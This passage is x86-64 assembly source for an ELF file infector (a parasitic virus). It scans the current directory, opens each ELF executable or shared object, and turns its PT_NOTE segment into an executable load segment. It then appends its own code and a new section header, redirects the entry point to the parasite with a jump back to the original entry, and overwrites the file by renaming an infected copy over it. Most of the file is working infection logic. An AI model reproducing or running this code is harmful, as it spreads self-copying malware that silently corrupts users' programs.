/*************************************************************************\
*                  Copyright (C) Owen Jiang, 2024.                   *
*                                                                         *
* This program is free software. You may use, modify, and redistribute it *
* under the terms of the GNU General Public License as published by the   *
* Free Software Foundation, either version 3 or (at your option) any      *
* later version. This program is distributed without any warranty.  See   *
* the file COPYING.gpl-v3 for details.                                    *
\*************************************************************************/
.section .text
.globl _start
_start:
push %rax
push %rbx
push %rcx
push %rdx
push %rdi
push %rsi
push %r8
push %r9
push %r10
push %r11
push %r12
push %r13
push %r14
push %r15
pushfq

push %rbp
mov %rsp,%rbp
subq $0X1000,%rsp
andq $0xfffffffffffffff0,%rsp
/*address_of_main(void*,0x08,-0x08(%rbp)),parasite_size(unsigned long ,0x08,-0x10(%rbp)),lret(long,0x08,-0x18(%rbp)),debugMsg(char[32],0x20,-0x38(%rbp))*/
/*,debugMsg1(char[32],0x20,-0x58(%rbp)),dd (uint32_t,0x04,-0x5c(%rbp)),pading(0x02,-0x5e(%rbp)),cwd(char[2],0x02,-0x60(%rbp)),buf([1024],0x400,linux_dirent64[],-0x460(%rbp))*/
/*nread(long,0x08,-0x468(%rbp)),d (linux_dirent64*,0x08, -0x470(%rbp)),bpos(int,0x04,-0x474(%rbp)),d_type(unsigned char,-0x01,0x475(%rbp))   pading([0x03] -0x478(%rbp))*/
/* debugMsg3(char[0x400],0x400,-0x878(%rbp)),d_name(void*,0x08,-0x880(%rbp)),dname_fd(unsigned long ,0x08,-0x888(%rbp)),dname_fd_st( struct stat,0x90, -0x918(%rbp)) */
/*basic_brk(void*,0x08,-0x920(%rbp)) file_mem(byte *,0x08,-0x928(%rbp)),dname_ehdr(Elf64_Ehdr *,0x08,-0x930(%rbp)),dname_phdr(Elf64_Phdr*,0x08,-0x938(%rbp))*/
/*dname_phnum(short,0x02,-0x93a(%rbp)),i(int,0x04,-0x93e(%rbp)),pading (,0x02,-0x940(%rbp)),p_phdr_ent(Elf64_Phdr*,0x08,-0x948(%rbp)),f_first_loadseg(int,0x04,-0x94c(%rbp))*/
/*pading(,0x04,-0x950(%rbp)),base_addr(Elf64_Addr,0x08,-0x958(%rbp)),obj_pgsize(unsigned long,0x08,-0x960(%rbp)),obj_align(unsigned long .0x08,-0x968(%rbp))*/
/*f_first_noteseg(int,0x04,-0x96c(%rbp)) pading(,0x04,-0x970(%rbp)),dname_filesz(ulong,0x08,-0x978(%rbp)),p_fist_noteseg(Elf64_Phdr*,0x08,-0x980(%rbp))*/
/*p_maxvaddr_ldseg(Elf64_Phdr*,0x08,-0x988(%rbp)),ldseg_maxaddr(ulong,0x08,-0x990(%rbp)),dname_shdr(Elf64_Shdr*,0x08,-0x998(%rbp)),pnew_shent(Elf64_Shdr*,0x08,-0x9a0(%rbp))*/
/*new_sec_vaddr(ulong,0x08,-0x9a8(%rbp)),new_fd(long,0x08,-0x9b0(%rbp)),new_shent_size(ulong ,0x08,-0x9b8(%rbp)),old_entry(ulong,0x08,-0x09c0(%rbp))*/
/*jump_code(byte[0x10],0x10,-0x9d0(%rbp))*/
movq $0,-0x08(%rbp)
movq $0,-0x10(%rbp)
movq $0,-0x18(%rbp)
#cmpq $0x1234567890,osis_reverse_parasite_size
#jne .osis_get_entry 
#/*movq $_start,-0x08(%rbp) 直接寻址*/
leaq _start(%rip), %rax  # 先加载到寄存器 rip寻址
movq %rax, -0x08(%rbp)   # 再移动到内存位置
leaq ._start_endl_exit(%rip),%rcx
subq %rax,%rcx
mov %rcx,-0x10(%rbp)
.osis_get_entry:

#addq $0xa,-0x10(%rbp)

###################### 01 print debugMsg#################
leaq -0x38(%rbp),%rdi
mov $0,%rsi
mov $0x20,%rdx
call osis_memset_rax

leaq -0x58(%rbp),%rdi
mov $0,%rsi
mov $0x20,%rdx
call osis_memset_rax

leaq -0x38(%rbp),%rax 
movb $0x54,(%rax)   #T
movb $0x68,1(%rax)  #h
movb $0x65,2(%rax)  #e
movb $0x20,3(%rax)  #space
movb $0x65,4(%rax)  #e
movb $0x6e,5(%rax)  #n
movb $0x74,6(%rax)  #t
movb $0x72,7(%rax)  #r
movb $0x79,8(%rax)  #y
movb $0x3a,9(%rax)  #:
movb $0x25,10(%rax) #%
movb $0x78,11(%rax)  #x
movb $0x0a,12(%rax)  #\n
movb $0x00,13(%rax)  #0

leaq -0x58(%rbp), %rdi
mov $31,%rsi
leaq -0x38(%rbp),%rdx  
mov -0x08(%rbp),%rcx
call osis_snprintf

mov $1,%rax #write
mov $1,%rdi #stdout
leaq -0x58(%rbp),%rsi
mov $31,%rdx
syscall
###################### end of 01 print debugMsg#################

leaq -0x60(%rbp),%rax
movb $0x2e,(%rax)
movb $0x00,1(%rax)

mov $2,%rax #open
leaq -0x60(%rbp),%rdi
mov $0x10000,%rsi #O_RDONLY | O_DIRECTORY 00000000|00200000=00200000=0x10000
mov $0,%rdx
syscall
test %rax,%rax
js ._start_endl 
mov %rax,-0x5c(%rbp) 

._start_get_dirent:
    mov $217,%rax # SYS_getdents64
    mov -0x5c(%rbp),%rdi
    leaq -0x460(%rbp),%rsi#buff
    mov $0x400,%rdx
    syscall
    test %rax,%rax
    js ._start_endl
    jz ._start_out_get_dirent 
    mov %rax,-0x468(%rbp) #nread
    movl $0,-0x474(%rbp)#bpos
    ._start_out_get_dirent_bpos:
        mov -0x468(%rbp),%rdx #nread
        movl -0x474(%rbp),%r9d #bpos movl auto zero-extend 0 to rax
        cmpq %r9,%rdx
        jle ._start_out_get_dirent_bpos_out
        leaq  -0x460(%rbp),%rsi
        addq %rsi,%r9
        movq %r9,-0x470(%rbp) 
        /*struct linux_dirent64* 
                  8               8                 2                    1                
        (unsigned long ino  long offset unsigned short d_reclen  unsigned char d_type   char d_naem[])
        */
        xor %r8,%r8
        mov 0x10(%r9),%r8w #d->d_reclen
        xor %r10,%r10
        mov -0x474(%rbp),%r10d #bpos 
        addl %r8d,%r10d
        movl %r10d,-0x474(%rbp) #bpos += d->d_reclen
        ###################### 02 print debugMsg#################
        leaq -0x878(%rbp),%rdi  #debugMsg3(char[0x400],-0x878(%rbp))
        mov $0,%rsi
        mov $0x400,%rdx
        call osis_memset_rax

        leaq -0x58(%rbp),%rdi
        mov $0,%rsi
        mov $0x20,%rdx
        call osis_memset_rax

        leaq -0x58(%rbp),%rax 
        movb $0x54,(%rax)   #T
        movb $0x68,1(%rax)  #h
        movb $0x65,2(%rax)  #e
        movb $0x20,3(%rax)  #space
        movb $0x66,4(%rax)  #f
        movb $0x6e,5(%rax)  #n
        movb $0x61,6(%rax)  #a
        movb $0x6d,7(%rax)  #m
        movb $0x65,8(%rax)  #e
        movb $0x3a,9(%rax)  #:
        movb $0x25,10(%rax) #%
        movb $0x73,11(%rax)  #s
        movb $0x0a,12(%rax)  #\n
        movb $0x00,13(%rax)  #0

        leaq -0x878(%rbp), %rdi
        mov $0x400,%rsi
        leaq -0x58(%rbp),%rdx 
        mov -0x470(%rbp) ,%r9
        lea 0x13(%r9),%rcx
        call osis_snprintf

        mov $1,%rax #write
        mov $1,%rdi #stdout
        leaq -0x878(%rbp),%rsi
        mov $0x400,%rdx
        syscall 
        mov -0x470(%rbp) ,%r9
        ###################### end of 02 print debugMsg#################

        xor %r8,%r8
        mov 0x12(%r9),%r8b  #d->d_type
        movb %r8b,-0x475(%rbp)

        cmpb $0x08,%r8b #DT_REG 普通文件
        je ._start_out_get_dirent_bpos_cmp1
        cmpb $0x04,%r8b #DT_DIR
        jne ._start_out_get_dirent_bpos 
        xor %rdi,%rdi
        mov 0x10(%r9), %di #d_reclen
        cmpw $0x18,%di
        jl ._start_out_get_dirent_bpos 
        
        xor %r8,%r8
        mov 0x13(%r9),%r8w
        cmpw $0x2e,%r8w #. ascii 0x46 r9w=0x002e .文件夹
        je ._start_out_get_dirent_bpos
        movl 0x13(%r9),%r8d
        and $0x002e2e,%r8d
        cmpl $0x002e2e,%r8d #..目录
        je  ._start_out_get_dirent_bpos
        /*可以添加代码递归新目录 待完成*/
        /*********************************/
        jne  ._start_out_get_dirent_bpos 
        ._start_out_get_dirent_bpos_cmp1:
        /*****************处理普通文件 process DT_REG*********/
        leaq  0x13(%r9),%rdi #d->d_name
        movq  %rdi, -0x880(%rbp)
        movl $0,%esi    #O_RDONLY movl will auto 0-extend rsi 
        movq $2,%rax #open
        syscall
        test %rax,%rax
        js ._start_out_get_dirent_bpos 
        mov %rax,-0x888(%rbp) #store dname_fd
        
        movq -0x880(%rbp),%rdi #d->d_name 
        leaq  -0x918(%rbp),%rsi #struct stat*st
         /*
        struct stat {
                        __kernel_ulong_t	st_dev;
                        __kernel_ulong_t	st_ino;
                        __kernel_ulong_t	st_nlink;

                        unsigned int		st_mode;
                        unsigned int		st_uid;
                        unsigned int		st_gid;
                        unsigned int		__pad0;
                        __kernel_ulong_t	st_rdev;
                        __kernel_long_t		st_size;
                        __kernel_long_t		st_blksize;
                        __kernel_long_t		st_blocks;

                        __kernel_ulong_t	st_atime;
                        __kernel_ulong_t	st_atime_nsec;
                        __kernel_ulong_t	st_mtime;
                        __kernel_ulong_t	st_mtime_nsec;
                        __kernel_ulong_t	st_ctime;
                        __kernel_ulong_t	st_ctime_nsec;
                        __kernel_long_t		__unused[3];
                    };
 
         */
        mov $4,%rax #stat
        syscall
        test %rax,%rax
        jns ._start_out_get_dirent_bpos_stat_1_continue
        mov -0x888(%rbp),%rdi # dname_fd
        mov $0x03,%rax #close
        syscall
        jmp ._start_out_get_dirent_bpos 

        ._start_out_get_dirent_bpos_stat_1_continue:
         /*
         mov $0,%rdi
         mov $12,%rax #brk
         syscall
         test %rax,%rax
         je ._start_out_get_dirent_bpos_brk_1_err
         cmp $-1,%rax
         je ._start_out_get_dirent_bpos_brk_1_err
         jmp ._start_out_get_dirent_bpos_brk_1_continue: 
         ._start_out_get_dirent_bpos_brk_1_err: 
         mov -0x888(%rbp),%rdi # dname_fd
         mov $0x03,%rax #close
         syscall
         jmp ._start_out_get_dirent_bpos  
         */
         mov $0,%rdi
         call osis_sbrk
         cmp $-1,%rax
         je ._start_out_get_dirent_bpos_brk_1_err
         mov %rax,-0x920(%rbp) #basic_brk
         
         lea -0x918(%rbp),%rax   #dname_fd_st( struct stat,0x90, -0x918(%rbp))
         mov 0x30(%rax),%rdi #st.st_size
         call osis_sbrk
         cmp $-1,%rax
         je ._start_out_get_dirent_bpos_brk_1_err
         mov -0x920(%rbp),%rsi
         mov %rsi,-0x928(%rbp) #file_mem(byte *,0x08,-0x928(%rbp))
         jmp ._start_out_get_dirent_bpos_brk_1_continue 

         ._start_out_get_dirent_bpos_brk_1_err: 
         mov -0x888(%rbp),%rdi # dname_fd
         mov $0x03,%rax #close
         syscall
         jmp ._start_out_get_dirent_bpos

         ._start_out_get_dirent_bpos_brk_1_continue:
         mov -0x888(%rbp),%rdi #dname_fd
         mov -0x928(%rbp),%rsi #file_mem
         lea -0x918(%rbp), %rax#dname_fd_st
         mov 0x30(%rax),%rdx   #st.st_size#
         mov $0,%rax # read 
         syscall
         cmp $-1,%rax
         jne ._start_out_get_dirent_bpos_read_1_contine

         _start_out_get_dirent_bpos_read_1_err:
         mov -0x888(%rbp),%rdi # dname_fd
         mov $0x03,%rax #close
         syscall
         mov -0x920(%rbp),%rdi # basic_brk
         call osis_brk
         jmp ._start_out_get_dirent_bpos
         
         ._start_out_get_dirent_bpos_read_1_contine:
         mov %rdx,-0x978(%rbp) #dname_filesz,0x08
         mov -0x928(%rbp),%rsi 
         mov  %rsi,-0x930(%rbp) #dname_ehdr( Elf64_Ehdr *)
         
         #   typedef struct
         #   {
         #   unsigned char	e_ident[16];	/* Magic number and other info */
         #   Elf64_Half	e_type;			/* Object file type */
         #   Elf64_Half	e_machine;		/* Architecture */
         #   Elf64_Word	e_version;		/* Object file version */
         #   Elf64_Addr	e_entry;		/* Entry point virtual address */
         #   Elf64_Off	e_phoff;		/* Program header table file offset */
         #   Elf64_Off	e_shoff;		/* Section header table file offset */
         #   Elf64_Word	e_flags;		/* Processor-specific flags */
         #   Elf64_Half	e_ehsize;		/* ELF header size in bytes */
         #   Elf64_Half	e_phentsize;		/* Program header table entry size */
         #   Elf64_Half	e_phnum;		/* Program header table entry count */
         #   Elf64_Half	e_shentsize;		/* Section header table entry size */
         #   Elf64_Half	e_shnum;		/* Section header table entry count */
         #   Elf64_Half	e_shstrndx;		/* Section header string table index */
         #   } Elf64_Ehdr;
         ._start_out_get_dirent_bpos_check_elf_hdr_1:
         movl (%rsi),%eax
         cmp $0x464c457f,%eax
         jne ._start_out_get_dirent_bpos_check_elf_hdr_1_fail
         movb 0x04(%rsi),%al
         cmpb $0x02,%al  #EI_CLASS 02 X64
         jne ._start_out_get_dirent_bpos_check_elf_hdr_1_fail
         movw 0x10(%rsi),%ax
         cmp $02,%ax #dname_ehdr->e_type
         #jne ._start_out_get_dirent_bpos_check_elf_hdr_1_fail     
         je ._start_out_get_dirent_bpos_check_elf_hdr_1_succ
         cmp $03,%ax 
         je ._start_out_get_dirent_bpos_check_elf_hdr_1_succ 

         ._start_out_get_dirent_bpos_check_elf_hdr_1_fail:
         mov -0x888(%rbp),%rdi # dname_fd
         mov $0x03,%rax #close
         syscall
         mov -0x920(%rbp),%rdi # basic_brk
         call osis_brk
         jmp ._start_out_get_dirent_bpos

        ._start_out_get_dirent_bpos_check_elf_hdr_1_succ:
        ._start_out_get_dirent_bpos_anlasize_elf_phdr:
        mov 0x20(%rsi),%rax #e_phoff
        cmp $0,%rax
        jle ._start_out_get_dirent_bpos_anlasize_elf_phdr_fail
        lea (%rsi,%rax),%rax
        mov %rax,-0x938(%rbp)  #dname_phdr (Elf64_Phdr*)

        mov 0x28(%rsi),%rax #e_shoff
        cmp $0,%rax
        jle ._start_out_get_dirent_bpos_anlasize_elf_phdr_fail
        lea (%rsi,%rax),%rax
        mov %rax,-0x998(%rbp)  #dname_shdr (Elf64_Shdr*)

        #typedef struct
        #{
        #Elf64_Word	p_type;			/* Segment type */ size:0x04
        #Elf64_Word	p_flags;		/* Segment flags */
        #Elf64_Off	p_offset;		/* Segment file offset */
        #Elf64_Addr	p_vaddr;		/* Segment virtual address */
        #Elf64_Addr	p_paddr;		/* Segment physical address */
        #Elf64_Xword	p_filesz;		/* Segment size in file */
        #Elf64_Xword	p_memsz;		/* Segment size in memory */
        #Elf64_Xword	p_align;		/* Segment alignment */
        #} Elf64_Phdr;
        movw 0x38(%rsi),%cx #e_phnum 
        movw %cx,-0x93a(%rbp)
        lea -0x93e(%rbp),%rax #i
        xor %rcx,%rcx
        movl %ecx,(%rax)
        movl %ecx,-0x94c(%rbp)#f_first_loadseg
        movl %ecx,-0x96c(%rbp)#f_first_noteseg,0x04
        mov %rcx,-0x958(%rbp)# base_addr
        mov %rcx,-0x980(%rbp)#p_fist_loadseg,0x08
        mov %rcx,-0x988(%rbp)#p_maxvaddr_ldseg 
        mov %rcx,-0x990(%rbp)#ldseg_maxaddr
        mov %rcx,-0x9a0(%rbp)#pnew_shent
        mov %rcx,-0x9a8(%rbp)#new_sec_vaddr
        mov %rcx,-0x9b8(%rbp) #new_shent_size
        mov %rcx,-0x9c0(%rbp) #old_entry

        mov -0x938(%rbp),%r9 #dname_phdr
        mov %r9,-0x948(%rbp)#p_phdr_ent
        mov $0x1000,%rcx
        mov %rcx,-0x960(%rbp)#obj_pgsize,0x08
        mov %rcx,-0x968(%rbp)#obj_align,0x08
        


        ._start_out_get_dirent_bpos_anlasize_elf_phdr_loop_1:
        movl -0x93e(%rbp),%ecx #i
        cmpw -0x93a(%rbp),%cx
        jae ._start_out_get_dirent_bpos_anlasize_elf_phdr_loop_1_out 
        mov -0x948(%rbp),%r9 #p_phdr_ent
        mov -0x930(%rbp),%r10#dname_ehdr
        xor %r8,%r8
        movw 0x36(%r10),%r8w #dname_ehdr->e_phentsize
        xor %rdx,%rdx
        test %rcx,%rcx
        jz ._start_out_get_dirent_bpos_anlasize_elf_phdr_loop1_test_1_jz 
        mov %r8,%rdx
        ._start_out_get_dirent_bpos_anlasize_elf_phdr_loop1_test_1_jz:
        ._start_out_get_dirent_bpos_anlasize_elf_phdr_loop1_test_1_jz_out:
        incq %rcx 
        mov %ecx,-0x93e(%rbp)
        lea (%r9,%rdx),%r9 #Elf64_Phdr* p_phdr_ent
        mov %r9,-0x948(%rbp)
        movl 0x00(%r9),%eax #p_phdr_ent->p_type
        ._start_out_get_dirent_bpos_anlasize_elf_phdr_loop_cmp_p_type:
        cmp $1,%eax #PT_LOAD
        je ._start_out_get_dirent_bpos_anlasize_elf_phdr_loop_cmp_p_type_load
        cmp $4,%eax #PT_NOTE
        je ._start_out_get_dirent_bpos_anlasize_elf_phdr_loop_cmp_p_type_note
        jmp ._start_out_get_dirent_bpos_anlasize_elf_phdr_loop_1
        ._start_out_get_dirent_bpos_anlasize_elf_phdr_loop_cmp_p_type_note:
        movl -0x96c(%rbp),%ecx #f_first_noteseg
        test %ecx,%ecx
        je ._start_out_get_dirent_bpos_anlasize_elf_phdr_loop_cmp_p_type_note_test_1_out
        jmp ._start_out_get_dirent_bpos_anlasize_elf_phdr_loop_1
        ._start_out_get_dirent_bpos_anlasize_elf_phdr_loop_cmp_p_type_note_test_1_out:
        movl $1,%ecx
        movl %ecx,-0x96c(%rbp)#f_first_noteseg,0x04
        mov %r9,-0x980(%rbp) #p_fist_noteseg
        jmp ._start_out_get_dirent_bpos_anlasize_elf_phdr_loop_1 
        
        ._start_out_get_dirent_bpos_anlasize_elf_phdr_loop_cmp_p_type_load: 
        movl -0x94c(%rbp),%eax #f_first_loadseg
        test %eax,%eax
        jne ._start_out_get_dirent_bpos_anlasize_elf_phdr_loop1_test_2_jne_out
        mov $1,%eax
        mov %eax,-0x94c(%rbp)#f_first_loadseg
        mov 0x10(%r9),%rax #p_phdr_ent->p_vaddr
        mov %rax,-0x958(%rbp)
        mov %rax,-0x990(%rbp)#ldseg_maxaddr
        mov %r9,-0x988(%rbp)#p_maxvaddr_ldseg
 
        ._start_out_get_dirent_bpos_anlasize_elf_phdr_loop1_test_2_jne_out:
       # movq %r9,-0x988(%rbp) #//p_maxvaddr_ldseg(Elf64_Phdr*,0x08,-0x988(%rbp))
        mov -0x990(%rbp),%rax #ldseg_maxaddr
        mov 0x10(%r9),%rcx #p_phdr_ent->p_vaddr
        cmp %rax,%rcx
        jle ._start_out_get_dirent_bpos_anlasize_elf_phdr_loop1_cmp_vaddr_out
        mov %rcx,-0x990(%rbp)#ldseg_maxaddr
        mov %r9,-0x988(%rbp)#p_maxvaddr_ldseg 

        ._start_out_get_dirent_bpos_anlasize_elf_phdr_loop1_cmp_vaddr_out:
        mov 0x04(%r9),%eax #p_hdr->p_flags,0x04
        mov $1,%ecx
        sal $2,%ecx
        xor $1,%ecx  #PF_R | PF_X
        and %ecx,%eax
        cmp %ecx,%eax
        jne ._start_out_get_dirent_bpos_anlasize_elf_phdr_loop_1

        ._start_out_get_dirent_bpos_anlasize_elf_phdr_loop_1_find_text:
        leaq _start(%rip), %rax
        leaq osis_reverse_magic(%rip),%rcx
        subq %rax,%rcx
        mov 0x08(%r9),%rax #p_offset
        add %rax,%rcx
        mov -0x928(%rbp),%rax #file_mem,0x08
        mov (%rax,%rcx),%rcx
        mov $0x9876543210,%rax
        cmpq %rcx, %rax
        je ._start_out_get_dirent_bpos_anlasize_elf_phdr_loop_1_out_1

        mov 0x30(%r9),%rax #p_align,0x08
        cmp $0,%rax
        jl ._start_out_get_dirent_bpos_anlasize_elf_phdr_loop_1_find_text_cmp_1_jl
        mov %rax,-0x960(%rbp) #obj_pgsize
        mov %rax,-0x968(%rbp) #obj_align

        ._start_out_get_dirent_bpos_anlasize_elf_phdr_loop_1_find_text_cmp_1_jl: 
        ._start_out_get_dirent_bpos_anlasize_elf_phdr_loop_1_find_text_cmp_1_out: 
         mov 0x20(%r9),%rax #p_filesz
         mov -0x960(%rbp),%rcx #obj_pgsize
         divq %rcx
         test %rdx,%rdx
         je ._start_out_get_dirent_bpos_anlasize_elf_phdr_loop_1_find_text_test_2_je
         incq %rax

         ._start_out_get_dirent_bpos_anlasize_elf_phdr_loop_1_find_text_test_2_je: 
         ._start_out_get_dirent_bpos_anlasize_elf_phdr_loop_1_find_text_test_2_je_out:
         ._start_out_get_dirent_bpos_anlasize_elf_phdr_loop_cmp_p_type_load_out:
         jmp ._start_out_get_dirent_bpos_anlasize_elf_phdr_loop_1








        ._start_out_get_dirent_bpos_anlasize_elf_phdr_loop_1_out:
        ._start_out_get_dirent_bpos_integrate_target_phdr:
        mov -0x96c(%rbp),%eax
        test %eax,%eax
        je ._start_out_get_dirent_bpos_anlasize_elf_phdr_loop_1_out_1
        mov -0x94c(%rbp),%eax
        test %eax,%eax
        je ._start_out_get_dirent_bpos_anlasize_elf_phdr_loop_1_out_1 
        mov -0x980(%rbp),%r9 #p_fist_noteseg
        mov -0x978(%rbp),%r8 #dname_filesz
        add $0x40,%r8 #add len of new sh 
        mov $1,%ecx
        mov %ecx,0x00(%r9) #p_type 
        mov $5,%ecx
        mov %ecx,0x04(%r9) #p_flags
        mov %r8,0x08(%r9) #p_offset
        mov -0x988(%rbp),%rsi #p_maxvaddr_ldseg
        mov 0x10(%rsi),%rcx #p_vaddr
        mov 0x28(%rsi),%rax #p_memsz
        add %rcx,%rax
        mov 0x30(%rsi),%rdi #p_align
        xor %rdx,%rdx
        divq %rdi
        test %rdx,%rdx
        je ._start_out_get_dirent_bpos_integrate_target_phdr_test_1_out
        inc %rax

        ._start_out_get_dirent_bpos_integrate_target_phdr_test_1_out: 
        mov 0x30(%rsi),%rcx #p_align
        xor %rdx,%rdx
        mulq %rcx #obj_align
        /*********add code address to the file offset modulo p_offset**************/
        xor %rdx,%rdx
        mov %rax,%r10
        mov 0x08(%r9) ,%rax#p_offset
        div %rcx
        add %rdx,%r10
        mov %r10,%rax
        /**********************************************/
        mov %rax,0x10(%r9) #p_vaddr
        mov %rax,0x18(%r9) #p_paddr
        mov %rax,-0x9a8(%rbp) #new_sec_vaddr
        mov -0x10(%rbp),%rax #parasite_size
        add $0x10,%rax #add len of jmp code
        mov %rax,0x20(%r9) #p_filesz
        mov %rax,0x28(%r9) #p_memsz
        mov -0x968(%rbp),%rax #obj_align
        mov %rax,0x30(%r9)

        ._start_out_get_dirent_bpos_integrate_target_shdr:
        
        ._start_out_get_dirent_bpos_integrate_target_shdr_check_ehdr:
        mov -0x930(%rbp),%r10 #dname_ehdr 
        xor %rcx,%rcx
        movw 0x3a(%r10),%cx # e_shentsize ,0x02
        xor %rax,%rax
        xor %rdx,%rdx
        movw 0x3c(%r10),%ax # e_shnum,0x02
        mulq %rcx
        mov 0x28(%r10),%r8 # e_shoff
        add %rax,%r8

        mov -0x978(%rbp),%rsi #dname_filesz 0x08,st.st_size
        cmp %rsi,%r8
        jne ._start_out_get_dirent_bpos_integrate_target_shdr_out_1

       ._start_out_get_dirent_bpos_integrate_target_shdr_alloc_new_shent:
        mov $0,%rdi
        call osis_sbrk
        cmp $-1,%rax
        je ._start_out_get_dirent_bpos_integrate_target_shdr_alloc_new_shent_out_1
        mov %rax,-0x9a0(%rbp)#pnew_shent
        mov -0x930(%rbp),%r10 #dname_ehdr 
        xor %rcx,%rcx
        movw 0x3a(%r10),%cx # e_shentsize ,0x02
        mov %rcx,%rdi
        call osis_sbrk
        cmp $-1,%rax
        je ._start_out_get_dirent_bpos_integrate_target_shdr_alloc_new_shent_out_1
        mov -0x9a0(%rbp),%rdi
        mov $0,%rsi
        mov -0x930(%rbp),%r10 #dname_ehdr 
        xor %rcx,%rcx
        movw 0x3a(%r10),%cx # e_shentsize ,0x02
        mov %rcx,-0x9b8(%rbp) #new_shent_size 
        mov %rcx,%rdx
        call osis_memset_rax

         /*
       #  typedef struct
       # {
       #Elf64_Word	sh_name;		/* Section name (string tbl index) */
       #Elf64_Word	sh_type;		/* Section type */
       #Elf64_Xword	sh_flags;		/* Section flags */
       #Elf64_Addr	sh_addr;		/* Section virtual addr at execution */
       #Elf64_Off	sh_offset;		/* Section file offset */
       #Elf64_Xword	sh_size;		/* Section size in bytes */
       #Elf64_Word	sh_link;		/* Link to another section */
       #Elf64_Word	sh_info;		/* Additional section information */
       #Elf64_Xword	sh_addralign;		/* Section alignment */
       #Elf64_Xword	sh_entsize;		/* Entry size if section holds table */
       #} Elf64_Shdr;
       # */
       mov -0x9a0(%rbp),%r9
       xor %rcx,%rcx
       mov %ecx,0x00(%r9) #sh_name ,0x04
       movl $1,%ecx
       mov %ecx,0x04(%r9) #sh_type
       mov $06,%rcx
       mov %rcx,0x08(%r9)
       mov -0x9a8(%rbp),%rcx #new_sec_vaddr
       mov %rcx,0x10(%r9) #sh_addr
       mov -0x978(%rbp),%rcx #dname_filesz
       add $0x40,%rcx #add len of new sh  
       mov %rcx,0x18(%r9) #sh_offset
       mov -0x10(%rbp),%rcx #parasite_size
       add $0x10,%rcx #add len of jmp code
       mov %rcx,0x20(%r9) #sh_size
       xor %rcx,%rcx
       mov %ecx,0x28(%r9) #sh_link
       mov %ecx,0x2c(%r9) #sh_info
       mov $0x10,%rcx
       mov %rcx,0x30(%r9) #sh_addralign
       xor %rcx,%rcx
       mov %rcx,0x38(%r9) #sh_entsize

       ._start_out_get_dirent_bpos_adjust_target_ehdr:
        mov -0x930(%rbp),%r9 #dname_ehdr
        mov 0x18(%r9),%rcx #e_entry
        mov %rcx,-0x09c0(%rbp) #old_entry
        mov -0x9a8(%rbp),%rcx #new_sec_vaddr
        mov %rcx,0x18(%r9) #e_entry
        movw 0x3c(%r9),%cx  #
        movzx %cx,%rcx
        inc %cx
        movw %cx,0x3c(%r9)


       ._start_out_get_dirent_bpos_generate_file:

       leaq -0x878(%rbp),%rdi  #debugMsg3(char[0x400],-0x878(%rbp))
       mov $0,%rsi
       mov $0x400,%rdx
       call osis_memset_rax

       leaq -0x58(%rbp),%rdi
       mov $0,%rsi
       mov $0x20,%rdx
       call osis_memset_rax

       leaq -0x58(%rbp),%rax
       movb $0x76,(%rax)   #s
       movb $0x73,1(%rax)  #v
       movb $0x2d,2(%rax)  #_
       movb $0x25,3(%rax)  #%
       movb $0x78,4(%rax)  #x
       movb $0x73,5(%rax)  #v
       movb $0x00,6(%rax)  #0

       leaq -0x38(%rbp),%rdi
       mov $0,%rsi
       mov $0x20,%rdx
       call osis_memset_rax

       leaq -0x38(%rbp),%rdi 
       movl $1,%edx
       mov $8,%rsi
       mov $0x13e,%rax #318 __NR_getrandom
       syscall

       leaq -0x878(%rbp), %rdi
       mov $0x400,%rsi
       leaq -0x58(%rbp),%rdx
       mov -0x38(%rbp),%rcx
       call osis_snprintf

       leaq -0x878(%rbp), %rdi
       mov $0x241,%rsi #O_CREAT | O_WRONLY | O_TRUN 01000|0100|01=01101=0x241
       lea -0x918(%rbp),%rax #dname_fd_st
       mov 0x18(%rax),%edx #st_mode
       mov $0x02,%rax #open
       syscall
       cmp $-1,%rax
       je ._start_out_get_dirent_bpos_generate_file_out_1

       mov %rax,-0x9b0(%rbp)#new_fd
       mov %rax,%rdi
       mov -0x928(%rbp),%rsi #file_mem
       mov -0x978(%rbp),%rdx #dname_filesz
       mov $1,%rax #write
       syscall
       cmp $-1,%rax
       je ._start_out_get_dirent_bpos_generate_file_out_1

       mov -0x9b0(%rbp),%rdi 
       mov -0x9a0(%rbp),%rsi #pnew_shent
       mov -0x9b8(%rbp),%rdx
       mov $1,%rax #write
       syscall

       mov -0x9b0(%rbp),%rdi
       mov -0x08(%rbp),%rsi #address_of_main
       mov -0x10(%rbp),%rdx
       mov $1,%rax #write
       syscall

       lea -0x9d0(%rbp),%rdi#jump_code
       mov $0x90,%rsi
       mov $0x10,%rdx
       call osis_memset_rax
      
       /* modify by owen jiang for RIP relative addressing 2024.12.19 */
      /* 
       lea -0x9d0(%rbp),%rax
       mov $0x48,%rcx 
       mov %rcx,(%rax)
       mov $0xc7,%rcx
       mov %rcx,0x01(%rax) 
       mov $0xc0,%rcx
       mov %rcx,0x02(%rax) 
       mov -0x09c0(%rbp),%rcx
       mov %ecx,0x03(%rax)
       mov $0xff,%rcx
       mov %rcx,0x07(%rax)
       mov $0xe0,%rcx
       mov %rcx,0x08(%rax)
       */
       
       lea -0x9d0(%rbp),%rax
       mov $0x48,%rcx 
       mov %rcx,(%rax)
       mov $0x8d,%rcx
       mov %rcx,0x01(%rax)
       mov $0x05,%rcx
       mov %rcx,0x02(%rax)  
       mov -0x09c0(%rbp),%rcx #old_entry
       mov -0x9a8(%rbp),%rdi #new_sec_vaddr
       mov -0x10(%rbp),%rsi #parasite_size
       add %rsi,%rdi
       add $0x07,%rdi #lea rip ra addresssing to rax ,the orignal code len is 0x48 +0x8d+0x05 + displacement
       sub %edi,%ecx 
       mov %ecx,0x03(%rax)
       mov $0xff,%rcx
       mov %rcx,0x07(%rax)
       mov $0xe0,%rcx
       mov %rcx,0x08(%rax) 
       /**********************************************************************/

       mov -0x9b0(%rbp),%rdi
       lea -0x9d0(%rbp),%rsi #jump_code
       mov $0x10,%rdx
       mov $1,%rax #write
       syscall

       mov -0x9b0(%rbp),%rdi
       mov $0x03,%rax #close
       syscall
       
       leaq -0x878(%rbp), %rdi 
       movq -0x880(%rbp), %rsi
       mov  $0x52,%rax #rename
       syscall

       nop






   
       













       
        

        ._start_out_get_dirent_bpos_anlasize_elf_phdr_fail:
        ._start_out_get_dirent_bpos_anlasize_elf_phdr_loop_1_out_1:
        ._start_out_get_dirent_bpos_integrate_target_shdr_out_1:
        ._start_out_get_dirent_bpos_integrate_target_shdr_alloc_new_shent_out_1:
        ._start_out_get_dirent_bpos_generate_file_out_1:
         mov -0x888(%rbp),%rdi # dname_fd
         mov $0x03,%rax #close
         syscall
         mov -0x920(%rbp),%rdi # basic_brk
         call osis_brk
